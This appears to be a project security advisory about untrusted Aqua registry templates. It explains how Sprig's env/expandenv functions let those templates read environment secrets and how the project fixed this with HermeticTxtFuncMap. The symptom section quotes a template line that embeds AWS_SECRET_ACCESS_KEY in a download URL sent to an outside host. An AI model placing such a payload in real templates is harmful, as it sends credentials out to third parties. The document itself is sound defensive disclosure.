# Sprig `env`/`expandenv` Exfiltration via Untrusted Templates

**Date:** 2026-04-01
**Severity:** Medium — CWE-526 (Cleartext Storage of Sensitive Information in Environment Variables)
**Scope:** Asset URL templates (Aqua registry, installer) — NOT stack templates (intentional feature)

**Files fixed:**
- `pkg/toolchain/installer/asset.go` (asset URL template rendering — was `TxtFuncMap` with no env cleanup)
- `pkg/toolchain/registry/aqua/aqua.go` (Aqua registry asset templates — was `TxtFuncMap` + manual `delete()`)

**Files updated (security improvement, backward-compatible):**
- `internal/exec/template_utils.go` — Sprig base switched to `HermeticTxtFuncMap`; `env`/`expandenv` re-added explicitly
- `pkg/locals/resolver.go` — Sprig base switched to `HermeticTxtFuncMap`; `env`/`expandenv` re-added explicitly

---

## Symptom

An Aqua registry YAML file or asset URL template containing:

```yaml
source: 'https://example.com/download?token={{ env "AWS_SECRET_ACCESS_KEY" }}'
```

would have been rendered successfully, allowing a remote/community registry template to read
arbitrary process environment variables (credentials, tokens) at install time.

---

## Root Cause

Multiple template rendering paths used `sprig.TxtFuncMap()` (or `sprig.FuncMap()`), which
includes `env`, `expandenv`, and `getHostByName`.

Sprig ships a hermetic variant specifically for untrusted-template contexts:

| Function | Exposes `env`/`expandenv` |
|----------|--------------------------|
| `sprig.FuncMap()` | **Yes** |
| `sprig.TxtFuncMap()` | **Yes** |
| `sprig.HermeticTxtFuncMap()` | **No** — intentionally omitted |

### Aqua registry templates (untrusted — now fixed)

`pkg/toolchain/installer/asset.go` and `pkg/toolchain/registry/aqua/aqua.go` render asset
URL templates from remote Aqua registries. These templates are partially untrusted and should
not be able to read arbitrary env vars. The `aqua.go` code attempted to mitigate this via
manual `delete(funcs, "env")` but this pattern is fragile. Both files now use
`sprig.HermeticTxtFuncMap()` directly.

### Stack templates (trusted — env is an intentional feature)

`internal/exec/template_utils.go` and `pkg/locals/resolver.go` render Atmos stack manifests.
`{{ env "KEY" }}` is a **documented, intentional feature** of Atmos stack templates, used e.g.
to inject non-sensitive runtime settings and metadata (such as `{{ env "USER" }}` in stack vars).
Avoid placing secrets directly in URL strings; use credential helpers, HTTP auth headers, or CI
secret stores instead.

The Sprig base is now `HermeticTxtFuncMap()` (removing other OS/network side-effects like
`getHostByName`) but `env` and `expandenv` are **explicitly re-added** as a deliberate design
decision, not inherited from the full Sprig map.

---

## Fix

### Aqua registry / installer templates (untrusted — full env removal)

```go
// pkg/toolchain/installer/asset.go — after
funcs := sprig.HermeticTxtFuncMap()  // env/expandenv omitted

// pkg/toolchain/registry/aqua/aqua.go — after (manual deletes replaced)
funcs := sprig.HermeticTxtFuncMap()  // env/expandenv/getHostByName omitted
```

### Stack templates (trusted — explicit re-provision)

```go
// internal/exec/template_utils.go — getSprigFuncMap uses HermeticTxtFuncMap
// getEnvFuncMap explicitly provides env/expandenv for stack templates
func getEnvFuncMap() template.FuncMap {
    return template.FuncMap{
        "env":       os.Getenv,
        "expandenv": os.ExpandEnv,
    }
}
// Assembled: gomplate + hermetic sprig + explicit env + atmos funcmap
funcs := lo.Assign(gomplate.CreateFuncs(ctx, &d), getSprigFuncMap(), getEnvFuncMap(), FuncMap(...))
```

---

## Related

- Sprig docs: <https://masterminds.github.io/sprig/> — "Hermetic" section
- CWE-526: <https://cwe.mitre.org/data/definitions/526.html>
